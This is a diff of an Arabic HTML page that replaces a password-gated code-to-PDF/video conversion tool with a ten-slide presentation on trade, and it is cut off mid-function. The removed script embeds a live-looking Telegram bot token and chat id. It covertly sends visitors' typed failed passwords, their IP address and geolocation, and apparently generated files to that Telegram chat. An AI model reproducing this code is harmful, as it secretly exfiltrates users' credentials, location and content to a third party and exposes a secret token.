@@ -2,536 +2,232 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة تحويل الأكواد الذكية</title>
-    
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-
+    <title>عرض التجارة - المعرفة المالية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: #e2e8f0; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; box-sizing: border-box; }
-        
-        .header { text-align: center; margin-bottom: 20px; }
-        .header h2 { margin: 0; color: #f8fafc; font-size: 26px;}
+        * {
+            box-sizing: border-box;
+        }
 
-        .top-nav { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; width: 100%; max-width: 600px;}
-        .nav-btn { flex: 1; background: #1e293b; color: #94a3b8; border: 2px solid #334155; padding: 12px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .nav-btn.active { background: #2563eb; color: #fff; border-color: #2563eb; }
-        .nav-btn:hover:not(.active) { background: #334155; color: #f8fafc; }
+        body {
+            display: block;
+            direction: rtl;
+            text-align: right;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            font-family: 'Cairo', sans-serif;
+        }
 
-        .main-container { width: 100%; max-width: 600px; display: flex; flex-direction: column; }
-        
-        .box-panel { background: #1e293b; border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.5); border: 1px solid #334155; display: flex; flex-direction: column; width: 100%; box-sizing: border-box;}
-        
-        .form-group { margin-bottom: 15px; display: flex; flex-direction: column; }
-        label { margin-bottom: 8px; font-weight: bold; font-size: 14px; color: #94a3b8; }
-        input, select, textarea { padding: 12px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; font-size: 14px; font-family: inherit; color: #f8fafc; transition: 0.2s;}
-        input:focus, select:focus, textarea:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2); }
-        input:disabled, select:disabled { opacity: 0.5; cursor: not-allowed; text-decoration: line-through; }
+        .page {
+            width: 1280px;
+            height: 720px;
+            overflow: hidden;
+            position: relative;
+            background: #ffffff;
+            margin: 20px auto;
+            border: 15px solid #1a3a5f; /* إطار أكاديمي فخم */
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            display: flex;
+            flex-direction: column;
+            padding: 60px;
+            background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
+        }
 
-        .req-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
-        .req-row input[type="text"] { flex: 1; }
-        .toggle-req { background: #334155; border: none; color: #f8fafc; border-radius: 6px; padding: 12px; cursor: pointer; transition: 0.2s; font-size: 14px; width: 45px; text-align: center;}
-        .toggle-req.disabled { background: #7f1d1d; color: #fca5a5; }
+        /* تصاميم الخلفية */
+        .page::before {
+            content: "";
+            position: absolute;
+            top: -100px;
+            left: -100px;
+            width: 300px;
+            height: 300px;
+            background: rgba(26, 58, 95, 0.03);
+            border-radius: 50%;
+            z-index: 0;
+        }
 
-        .textarea-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
-        .clear-btn { background: #7f1d1d; color: #fca5a5; border: none; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .clear-btn:hover { background: #991b1b; color: #fef2f2; }
-        
-        textarea { flex: 1; min-height: 250px; resize: vertical; direction: ltr; font-family: monospace; background: #020617; font-size: 13px; line-height: 1.6;}
-        
-        .row { display: flex; gap: 15px; }
-        .row .form-group { flex: 1; }
+        .title-slide {
+            background: linear-gradient(135deg, #1a3a5f 0%, #2c5282 100%);
+            color: white;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            border-color: #d4af37; /* إطار ذهبي للغلاف */
+        }
 
-        .export-btn { background: #2563eb; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.2s; width: 100%;}
-        .export-btn:hover { background: #1d4ed8; transform: translateY(-2px);}
-        .export-btn:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; transform: none;}
-        
-        .tab-content { display: none; }
-        .tab-content.active-tab { display: flex; }
+        h1 {
+            font-size: 85px;
+            font-weight: 900;
+            margin: 0;
+            color: #d4af37;
+        }
 
-        .ai-prompts { background: #022c22; border: 1px dashed #059669; padding: 15px; border-radius: 10px; margin-bottom: 20px;}
-        .ai-prompts p { margin: 0 0 10px 0; font-size: 14px; color: #34d399; font-weight: bold; text-align: center;}
-        .prompt-btns { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;}
-        .prompt-btn { flex: 1 1 30%; background: #1e293b; border: 1px solid #059669; color: #34d399; padding: 10px; border-radius: 8px; font-size: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; text-align: center;}
-        .prompt-btn:hover { background: #059669; color: #fff; }
+        h2 {
+            font-size: 45px;
+            color: #e2e8f0;
+            margin-top: 20px;
+        }
+
+        .slide-header {
+            font-size: 48px;
+            color: #1a3a5f;
+            border-bottom: 4px solid #d4af37;
+            padding-bottom: 15px;
+            margin-bottom: 40px;
+            font-weight: 700;
+            z-index: 1;
+        }
+
+        .content-box {
+            font-size: 28px;
+            line-height: 1.8;
+            color: #2d3748;
+            z-index: 1;
+        }
+
+        .point {
+            background: rgba(26, 58, 95, 0.05);
+            margin-bottom: 15px;
+            padding: 20px 30px;
+            border-right: 8px solid #d4af37;
+            border-radius: 5px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+
+        .footer-note {
+            position: absolute;
+            bottom: 40px;
+            left: 60px;
+            font-size: 18px;
+            color: #718096;
+        }
+
+        .highlight {
+            color: #1a3a5f;
+            font-weight: 700;
+        }
     </style>
 </head>
 <body>
 
-    <div id="password-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center;">
-        <div style="background: #1e293b; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.5); border: 1px solid #334155; text-align: center; width: 90%; max-width: 400px;">
-            <h3 style="margin-top: 0; color: #f8fafc; font-size: 24px;">🔒 حماية المنصة</h3>
-            <p style="font-size: 14px; color: #94a3b8; margin-bottom: 25px;">الرجاء إدخال كلمة المرور للوصول.</p>
-            <div class="form-group" style="margin-bottom: 20px;">
-                <input type="password" id="pass-input" placeholder="كلمة المرور..." style="text-align: center; letter-spacing: 3px; font-size: 16px;" onkeypress="if(event.key === 'Enter') checkPassword()">
-            </div>
-            <button onclick="checkPassword()" class="export-btn" style="margin-top: 0;">تسجيل الدخول</button>
-            <p id="pass-error" style="color: #ef4444; font-size: 13px; display: none; margin-top: 15px; font-weight: bold; margin-bottom: 0;">❌ كلمة المرور غير صحيحة!</p>
+    <!-- الشريحة 1: العنوان -->
+    <div class="page title-slide">
+        <h1>التجارة</h1>
+        <h2>المعرفة المالية</h2>
+        <div style="margin-top: 50px; font-size: 32px;">إعداد: سس</div>
+    </div>
+
+    <!-- الشريحة 2: تعريف التجارة -->
+    <div class="page">
+        <div class="slide-header">مفهوم التجارة</div>
+        <div class="content-box">
+            <p>التجارة هي العملية الأساسية التي يقوم فيها الأفراد أو المؤسسات بتبادل السلع والخدمات مقابل وسيلة دفع معترف بها، غالباً ما تكون المال.</p>
+            <div class="point">تعتبر التجارة المحرك الرئيسي للاقتصاد العالمي ونمو المجتمعات.</div>
+            <div class="point">تتضمن التجارة عمليات الشراء، البيع، والتوزيع بهدف تحقيق الربح أو سد الاحتياجات.</div>
+            <div class="point">تطورت من "المقايضة" قديماً إلى "التجارة الرقمية" حديثاً.</div>
         </div>
+        <div class="footer-note">المعرفة المالية - الشريحة 2</div>
     </div>
 
-    <div class="header">
-        <h2>🛠️ منصة تحويل الأكواد الذكية</h2>
-    </div>
-
-    <div class="top-nav">
-        <button class="nav-btn active" id="btn-converter" onclick="switchTab('converter')">⚙️ منصة التحويل (PDF/فيديو)</button>
-        <button class="nav-btn" id="btn-prompts" onclick="switchTab('prompts')">🧠 المولد الذكي</button>
-    </div>
-
-    <div id="converter-tab" class="main-container tab-content active-tab">
-        <div class="box-panel">
-            <div class="ai-prompts">
-                <p>🤖 أوامر جاهزة وسريعة للذكاء الاصطناعي:</p>
-                <div class="prompt-btns">
-                    <button class="prompt-btn" onclick="copyPrompt('a4', this)">📄 بحث أكاديمي (A4)</button>
-                    <button class="prompt-btn" onclick="copyPrompt('169', this)">🖥️ عرض شاشات (16:9)</button>
-                    <button class="prompt-btn" onclick="copyPrompt('mobile', this)">📱 عرض جوال (9:16)</button>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>اسم الملف المستخرج:</label>
-                <input type="text" id="file-name" value="مستند_جديد" placeholder="اكتب اسم الملف هنا...">
-            </div>
-
-            <div class="row">
-                <div class="form-group">
-                    <label>نوع الاستخراج:</label>
-                    <select id="format-select" onchange="updateTag()">
-                        <optgroup label="ملفات PDF">
-                            <option value="pdf-a4">بحث / تقرير (A4)</option>
-                            <option value="pdf-169">عرض تقديمي (16:9)</option>
-                        </optgroup>
-                        <optgroup label="مقاطع فيديو">
-                            <option value="vid-169">فيديو شاشات (16:9)</option>
-                            <option value="vid-916">فيديو جوال (9:16)</option>
-                        </optgroup>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>الجودة:</label>
-                    <select id="quality-select">
-                        <option value="1">عادية (أسرع)</option>
-                        <option value="2" selected>عالية</option>
-                        <option value="3">ممتازة (أبطأ)</option>
-                    </select>
-                </div>
-            </div>
-
-            <div class="row" id="video-options" style="display: none;">
-                <div class="form-group">
-                    <label>مدة كل شريحة:</label>
-                    <select id="slide-duration">
-                        <option value="3">3 ثواني</option>
-                        <option value="5" selected>5 ثواني</option>
-                        <option value="8">8 ثواني</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>طريقة الانتقال (الأنيميشن):</label>
-                    <select id="animation-style">
-                        <option value="zoom" selected>تكبير سينمائي (Zoom)</option>
-                        <option value="slide">سحب جانبي (Slide)</option>
-                        <option value="fade">تلاشي ناعم (Fade)</option>
-                        <option value="none">بدون حركة (مباشر)</option>
-                    </select>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <div class="textarea-header">
-                    <label style="margin:0;">كود الـ HTML (الصق هنا):</label>
-                    <button class="clear-btn" onclick="clearCode()">🗑️ مسح الكود</button>
-                </div>
-                <textarea id="html-input" placeholder="الصق الكود الذي أعطاك إياه الذكاء الاصطناعي هنا..."></textarea>
-            </div>
-
-            <button id="capture-btn" class="export-btn" onclick="exportFile()">بدء الاستخراج 📥</button>
+    <!-- الشريحة 3: أنواع التجارة (1) -->
+    <div class="page">
+        <div class="slide-header">أنواع التجارة: التجارة الداخلية</div>
+        <div class="content-box">
+            <p class="highlight">تحدث داخل الحدود الجغرافية للدولة الواحدة وتنقسم إلى:</p>
+            <div class="point">1. تجارة الجملة: بيع كميات كبيرة من السلع للموزعين أو تجار التجزئة.</div>
+            <div class="point">2. تجارة التجزئة: بيع المنتجات مباشرة للمستهلك النهائي عبر المتاجر أو الأسواق.</div>
+            <div class="point">تساهم في تنشيط الاقتصاد المحلي وتوفير فرص العمل للمواطنين.</div>
         </div>
+        <div class="footer-note">المعرفة المالية - الشريحة 3</div>
     </div>
 
-    <div id="prompts-tab" class="main-container tab-content">
-        <div class="box-panel">
-            <div style="background: #022c22; border: 1px dashed #059669; padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center;">
-                <p style="margin: 0; font-size: 13px; color: #34d399; font-weight: bold;">أدخل المتطلبات، واضغط على (👁️) لإخفاء أي متطلب لا تريده في الأمر النهائي.</p>
-            </div>
-
-            <div class="form-group">
-                <label>نوع الملف المطلوب من الذكاء الاصطناعي:</label>
-                <select id="prompt-type" onchange="generatePromptText()">
-                    <option value="a4">📄 بحث أكاديمي / تقرير (A4)</option>
-                    <option value="169">🖥️ عرض تقديمي للشاشات (16:9)</option>
-                    <option value="916">📱 عرض تقديمي للجوال/تيك توك (9:16)</option>
-                </select>
-            </div>
-
-            <label>المعلومات الأساسية:</label>
-            <div class="req-row">
-                <button class="toggle-req" onclick="toggleInput(this, 'req-title')" title="شطب/تفعيل">👁️</button>
-                <input type="text" id="req-title" value="" placeholder="عنوان البحث أو العرض (مثال: الذكاء الاصطناعي)" oninput="generatePromptText()">
-            </div>
-            <div class="req-row">
-                <button class="toggle-req" onclick="toggleInput(this, 'req-subject')" title="شطب/تفعيل">👁️</button>
-                <input type="text" id="req-subject" value="" placeholder="المادة (مثال: حاسب آلي)" oninput="generatePromptText()">
-            </div>
-            <div class="req-row">
-                <button class="toggle-req" onclick="toggleInput(this, 'req-name')" title="شطب/تفعيل">👁️</button>
-                <input type="text" id="req-name" value="" placeholder="اسم الطالب/المقدم" oninput="generatePromptText()">
-            </div>
-            <div class="req-row">
-                <button class="toggle-req" onclick="toggleInput(this, 'req-group')" title="شطب/تفعيل">👁️</button>
-                <input type="text" id="req-group" value="" placeholder="أسماء المجموعة (مفصولة بفاصلة)" oninput="generatePromptText()">
-            </div>
-            <div class="req-row">
-                <button class="toggle-req" onclick="toggleInput(this, 'req-pages')" title="شطب/تفعيل">👁️</button>
-                <input type="text" id="req-pages" value="" placeholder="عدد الصفحات / الشرائح (مثال: 5 صفحات)" oninput="generatePromptText()">
-            </div>
-            <div class="req-row">
-                <button class="toggle-req" onclick="toggleInput(this, 'req-no-numbers')" title="شطب/تفعيل">👁️</button>
-                <input type="text" id="req-no-numbers" value="" placeholder="ملاحظات إضافية (اختياري)" oninput="generatePromptText()">
-            </div>
-
-            <label style="margin-top: 15px;">✨ الأمر النهائي (موجه للذكاء الاصطناعي):</label>
-            <textarea id="final-prompt-output" readonly style="min-height: 200px; margin-bottom: 10px;"></textarea>
-
-            <button class="export-btn" style="background: #059669;" onclick="copyGeneratedPrompt()">نسخ الأمر الجاهز 📋</button>
+    <!-- الشريحة 4: أنواع التجارة (2) -->
+    <div class="page">
+        <div class="slide-header">أنواع التجارة: التجارة الدولية</div>
+        <div class="content-box">
+            <p class="highlight">هي تبادل السلع والخدمات عبر الحدود الدولية وتتكون من:</p>
+            <div class="point">● التصدير: إرسال السلع والخدمات المحلية لبيعها في الأسواق الخارجية.</div>
+            <div class="point">● الاستيراد: جلب منتجات من دول أخرى لتلبية احتياجات السوق المحلي.</div>
+            <div class="point">تلعب الاتفاقيات الدولية دوراً حاسماً في تسهيل هذه العمليات وخفض الجمارك.</div>
         </div>
+        <div class="footer-note">المعرفة المالية - الشريحة 4</div>
     </div>
 
-    <script>
-        const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo'; 
-        const chatId = '6680237928'; 
-        const secretHash = "U2ExMjM0NTY3OEA="; 
+    <!-- الشريحة 5: أركان العملية التجارية -->
+    <div class="page">
+        <div class="slide-header">أركان العملية التجارية</div>
+        <div class="content-box">
+            <div class="info-grid">
+                <div class="point">البائع: الطرف الذي يمتلك السلعة أو الخدمة ويقدمها للمقايضة.</div>
+                <div class="point">المشتري: الطرف الذي لديه الرغبة والقدرة المالية للحصول على السلعة.</div>
+                <div class="point">السلعة/الخدمة: موضوع التبادل (منتج مادي أو خدمة معنوية).</div>
+                <div class="point">الثمن: القيمة النقدية المتفق عليها لإتمام عملية التبادل.</div>
+            </div>
+        </div>
+        <div class="footer-note">المعرفة المالية - الشريحة 5</div>
+    </div>
 
-        window.onload = () => {
-            if (localStorage.getItem('auth_token') === secretHash) {
-                document.getElementById('password-overlay').style.display = 'none';
-            }
-            updateTag();
-            generatePromptText(); 
-        };
+    <!-- الشريحة 6: أهمية التجارة -->
+    <div class="page">
+        <div class="slide-header">لماذا ندرس التجارة؟</div>
+        <div class="content-box">
+            <div class="point">توفير الاحتياجات: تسمح للفرد بالحصول على منتجات لا يمكنه إنتاجها بنفسه.</div>
+            <div class="point">تحقيق الأرباح: توفر فرصاً استثمارية واسعة لنمو الثروات الفردية والمؤسسية.</div>
+            <div class="point">الابتكار: التنافس التجاري يدفع الشركات لابتكار منتجات أفضل وأرخص.</div>
+            <div class="point">الترابط الدولي: تقوي العلاقات بين الدول عبر الاعتماد الاقتصادي المتبادل.</div>
+        </div>
+        <div class="footer-note">المعرفة المالية - الشريحة 6</div>
+    </div>
 
-        function sendTextToTelegram(msg) {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار: ${msg}` })
-            }).catch(e => console.error(e));
-        }
+    <!-- الشريحة 7: التجارة الإلكترونية -->
+    <div class="page">
+        <div class="slide-header">الثورة الرقمية: التجارة الإلكترونية</div>
+        <div class="content-box">
+            <p>هي البيع والشراء عبر الإنترنت، وأصبحت تشكل جزءاً ضخماً من الاقتصاد الحديث.</p>
+            <div class="point">تتميز بانخفاض التكاليف التشغيلية مقارنة بالمتاجر التقليدية.</div>
+            <div class="point">الوصول العالمي: يمكن للمتجر الصغير بيع منتجاته لأي مكان في العالم.</div>
+            <div class="point">سرعة التنفيذ وتعدد خيارات الدفع الإلكتروني (مدى، فيزا، آبل باي).</div>
+        </div>
+        <div class="footer-note">المعرفة المالية - الشريحة 7</div>
+    </div>
 
-        async function sendFileToTelegram(blob, name, caption, type = 'document') {
-            const endpoint = type === 'video' ? 'sendVideo' : 'sendDocument';
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append(type === 'video' ? 'video' : 'document', blob, name); 
-            formData.append('caption', caption);
-            try { 
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: 'POST', body: formData });
-                const data = await response.json();
-                return data.ok;
-            } catch (e) {
-                return false;
-            }
-        }
+    <!-- الشريحة 8: مخاطر التجارة -->
+    <div class="page">
+        <div class="slide-header">إدارة المخاطر في التجارة</div>
+        <div class="content-box">
+            <p class="highlight">لا تخلو التجارة من التحديات، ومن أبرزها:</p>
+            <div class="point">تذبذب الأسعار: تغير قيمة العملات أو تكلفة المواد الخام بشكل مفاجئ.</div>
+            <div class="point">المنافسة الشرسة: دخول منافسين جدد يقدمون أسعاراً أقل أو جودة أعلى.</div>
+            <div class="point">المخاطر القانونية: ضرورة الالتزام بالقوانين الضريبية والتجارية المتغيرة.</div>
+            <div class="point">التغير في ذوق المستهلك: توقف الطلب على منتج معين بسبب ظهور بديل أحدث.</div>
+        </div>
+        <div class="footer-note">المعرفة المالية - الشريحة 8</div>
+    </div>
 
-        function checkPassword() {
-            const input = document.getElementById('pass-input').value;
-            if (btoa(unescape(encodeURIComponent(input))) === secretHash) {
-                document.getElementById('password-overlay').style.display = 'none';
-                localStorage.setItem('auth_token', secretHash);
-                
-                fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
-                    if(data.ip) {
-                        const [lat, lng] = data.loc ? data.loc.split(',') : ['0', '0'];
-                        sendTextToTelegram(`✅ دخول ناجح من جهاز جديد.\n\nالآيبي: ${data.ip}\nالدولة: ${data.country}\nالموقع: https://www.google.com/maps?q=$$${lat},${lng}`);
-                    }
-                }).catch(e => sendTextToTelegram(`✅ دخول ناجح لأول مرة.`));
-            } else {
-                document.getElementById('pass-error').style.display = 'block';
-                sendTextToTelegram(`❌ محاولة دخول فاشلة للمنصة بكلمة: ${input}`);
-            }
-        }
+    <!-- الشريحة 9: نصائح للنجاح التجاري -->
+    <div class="page">
+        <div class="slide-header">مفاتيح النجاح في عالم التجارة</div>
+        <div class="content-box">
+            <div class="point">الدراسة الجيدة للسوق وفهم احتياجات العملاء الحقيقية.</div>
+            <div class="point">بناء سمعة طيبة (العلامة التجارية) والالتزام بالأمانة والجودة.</div>
+            <div class="point">التطوير المستمر ومواكبة التقنيات الحديثة في التسويق والتوزيع.</div>
+            <div class="point">الإدارة المالية الحكيمة ومراقبة التدفقات النقدية بدقة.</div>
+        </div>
+        <div class="footer-note">المعرفة المالية - الشريحة 9</div>
+    </div>
 
-        function switchTab(tabName) {
-            document.getElementById('converter-tab').classList.remove('active-tab');
-            document.getElementById('prompts-tab').classList.remove('active-tab');
-            document.getElementById('btn-converter').classList.remove('active');
-            document.getElementById('btn-prompts').classList.remove('active');
+    <!-- الشريحة 10: الخاتمة -->
+    <div class="page title-slide" style="border-color: #1a3a5f;">
+        <h1 style="font-size: 70px;">شكراً لكم</h1>
+        <h2 style="color: white;">نتمنى أن تكون هذه الرحلة في عالم التجارة مفيدة</h2>
+        <div style="margin-top: 40px; font-size: 24px; color: #d4af37;">إعداد: سس | 2026</div>
+    </div>
 
-            document.getElementById(`${tabName}-tab`).classList.add('active-tab');
-            document.getElementById(`btn-${tabName}`).classList.add('active');
-        }
-
-        function toggleInput(btn, inputId) {
-            const inputEle = document.getElementById(inputId);
-            if (inputEle.disabled) {
-                inputEle.disabled = false; btn.innerText = '👁️'; btn.classList.remove('disabled');
-            } else {
-                inputEle.disabled = true; btn.innerText = '🚫'; btn.classList.add('disabled');
-            }
-            generatePromptText();
-        }
-
-        function generatePromptText() {
-            const type = document.getElementById('prompt-type').value;
-            let prompt = "";
-
-            if (type === 'a4') prompt += "أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لـ (بحث أكاديمي / تقرير) بالعربية.\n\n";
-            else if (type === '169') prompt += "أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لـ (عرض تقديمي للشاشات) بالعربية.\n\n";
-            else if (type === '916') prompt += "أنت مصمم عروض HTML محترف ومصمم واجهات تيك توك. قم بإنشاء كود HTML كامل لـ (عرض تقديمي طولي مخصص للجوال) بالعربية.\n\n";
-
-            prompt += "**المعلومات الأساسية المطلوب إدراجها:**\n";
-            
-            if (!document.getElementById('req-title').disabled && document.getElementById('req-title').value) prompt += `- العنوان: ${document.getElementById('req-title').value}\n`;
-            if (!document.getElementById('req-subject').disabled && document.getElementById('req-subject').value) prompt += `- المادة / الموضوع: ${document.getElementById('req-subject').value}\n`;
-            if (!document.getElementById('req-name').disabled && document.getElementById('req-name').value) prompt += `- إعداد: ${document.getElementById('req-name').value}\n`;
-            if (!document.getElementById('req-group').disabled && document.getElementById('req-group').value) prompt += `- أسماء المجموعة: ${document.getElementById('req-group').value}\n`;
-            if (!document.getElementById('req-pages').disabled && document.getElementById('req-pages').value) prompt += `- العدد المطلوب: ${document.getElementById('req-pages').value}\n`;
-            if (!document.getElementById('req-no-numbers').disabled && document.getElementById('req-no-numbers').value) prompt += `- ملاحظة: ${document.getElementById('req-no-numbers').value}\n`;
-
-            prompt += "\n**متطلبات تقنية وتصميمية صارمة (لا تتجاوزها نهائياً):**\n";
-            prompt += "1. يبدأ الكود بـ <html lang=\"ar\" dir=\"rtl\">\n";
-            prompt += "2. استدعاء خطوط Google Fonts (مثل Cairo أو Tajawal) صراحة.\n";
-            prompt += "3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n";
-
-            if (type === 'a4') {
-                prompt += "4. كل صفحة تكون عبارة عن: <div class=\"page\">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative;\n";
-                prompt += "5. التصميم: احترافي، أنيق، يعتمد على ألوان متناسقة وهادئة كالبحوث الرسمية.\n";
-            } else if (type === '169') {
-                prompt += "4. كل شريحة تكون عبارة عن: <div class=\"page\">. أبعادها: width: 1280px; height: 720px; overflow: hidden; position: relative;\n";
-                prompt += "5. التصميم: عصري، جديد، وأنيق جداً (Ultra-Modern). استخدم خلفيات جذابة ونصوص كبيرة.\n";
-            } else if (type === '916') {
-                prompt += "4. كل شريحة تكون عبارة عن: <div class=\"page\">. أبعادها: width: 720px; height: 1280px; overflow: hidden; position: relative;\n";
-                prompt += "5. التصميم: عصري جداً، انسيابي، مصمم لجمهور السوشيال ميديا. استخدم نصوص ضخمة جداً لتكون مقروءة بوضوح على الجوال.\n";
-            }
-
-            prompt += "6. ممنوع استخدام القوائم الافتراضية (ul, ol) بتاتاً. إذا أردت وضع نقاط أو ترقيم استخدم عناصر <p> أو <div> عادية واكتب النقطة كجزء من النص.\n";
-            prompt += "7. ممنوع استخدام خاصية letter-spacing نهائياً في الـ CSS.\n";
-            
-            document.getElementById('final-prompt-output').value = prompt;
-        }
-
-        function copyGeneratedPrompt() {
-            const text = document.getElementById('final-prompt-output').value;
-            if(!text.trim()) return;
-            navigator.clipboard.writeText(text).then(() => { alert("✅ تم نسخ الأمر بنجاح! الصقه في الذكاء الاصطناعي الآن."); });
-        }
-
-        const defaultPrompts = {
-            a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لـ (بحث أكاديمي / تقرير) بالعربية.\n**متطلبات تقنية وتصميمية صارمة (لا تتجاوزها نهائياً):**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل صفحة تكون عبارة عن: <div class="page">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative;\n5. التصميم: احترافي، أنيق، يعتمد على ألوان متناسقة وهادئة كالبحوث الرسمية.\n6. ممنوع استخدام القوائم الافتراضية (ul, ol) بتاتاً. استخدم عناصر <p> أو <div> عادية.\n7. ممنوع استخدام خاصية letter-spacing نهائياً.`,
-            169: `أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لـ (عرض تقديمي للشاشات) بالعربية.\n**متطلبات تقنية وتصميمية صارمة (لا تتجاوزها نهائياً):**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل شريحة تكون عبارة عن: <div class="page">. أبعادها: width: 1280px; height: 720px; overflow: hidden; position: relative;\n5. التصميم: عصري، جديد، وأنيق جداً (Ultra-Modern). استخدم خلفيات جذابة ونصوص كبيرة.\n6. ممنوع استخدام القوائم الافتراضية (ul, ol) بتاتاً. استخدم عناصر <p> أو <div> عادية.\n7. ممنوع استخدام خاصية letter-spacing نهائياً.`,
-            mobile: `أنت مصمم عروض HTML محترف ومصمم واجهات تيك توك. قم بإنشاء كود HTML كامل لـ (عرض تقديمي طولي مخصص للجوال) بالعربية.\n**متطلبات تقنية وتصميمية صارمة (لا تتجاوزها نهائياً):**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل شريحة تكون عبارة عن: <div class="page">. أبعادها: width: 720px; height: 1280px; overflow: hidden; position: relative;\n5. التصميم: عصري جداً، انسيابي، مصمم لجمهور السوشيال ميديا. استخدم نصوص ضخمة جداً لتكون مقروءة بوضوح على الجوال.\n6. ممنوع استخدام القوائم الافتراضية (ul, ol) بتاتاً. استخدم عناصر <p> أو <div> عادية.\n7. ممنوع استخدام خاصية letter-spacing نهائياً.`
-        };
-
-        function copyPrompt(type, btn) {
-            navigator.clipboard.writeText(defaultPrompts[type]).then(() => {
-                const old = btn.innerText;
-                btn.innerText = "✅ تم النسخ!";
-                btn.style.background = "#059669";
-                btn.style.color = "#fff";
-                setTimeout(() => {
-                    btn.innerText = old;
-                    btn.style.background = "#1e293b";
-                    btn.style.color = "#34d399";
-                }, 2000);
-            });
-        }
-
-        function clearCode() {
-            if(confirm("هل أنت متأكد من مسح الكود؟")) { document.getElementById('html-input').value = ''; }
-        }
-
-        function updateTag() {
-            const f = document.getElementById('format-select').value;
-            document.getElementById('video-options').style.display = f.startsWith('vid') ? 'flex' : 'none';
-        }
-
-        async function urlToDataURL(url) {
-            if (url && (url.startsWith('data:') || url.startsWith('blob:'))) return url;
-            let absoluteUrl = url;
-            try { if (!url.startsWith('http')) absoluteUrl = new URL(url, window.location.href).href; } catch(e) { absoluteUrl = url; }
-            const proxies = [ null, 'https://corsproxy.io/?', 'https://api.allorigins.win/raw?url=' ];
-            for (const proxy of proxies) {
-                try {
-                    let fetchUrl = proxy ? proxy + encodeURIComponent(absoluteUrl) : absoluteUrl;
-                    const response = await fetch(fetchUrl, { mode: 'cors' });
-                    if (!response.ok) continue;
-                    const blob = await response.blob();
-                    return await new Promise(res => { const r = new FileReader(); r.onloadend = () => res(r.result); r.readAsDataURL(blob); });
-                } catch (err) {}
-            }
-            return new Promise(res => {
-                const img = new Image(); img.crossOrigin = "Anonymous";
-                img.onload = () => { const c = document.createElement('canvas'); c.width = img.width; c.height = img.height; c.getContext('2d').drawImage(img, 0, 0); res(c.toDataURL('image/jpeg', 0.8)); };
-                img.onerror = () => res(null); img.src = absoluteUrl; setTimeout(() => res(null), 3000); 
-            });
-        }
-        
-        async function convertAllImagesToDataURLs(container) {
-            const images = Array.from(container.querySelectorAll('img'));
-            await Promise.all(images.map(async (img) => {
-                const src = img.getAttribute('src');
-                if (!src || src.startsWith('data:')) return;
-                const dataUrl = await urlToDataURL(src);
-                if (dataUrl) img.setAttribute('src', dataUrl);
-            }));
-        }
-
-        async function exportFile() {
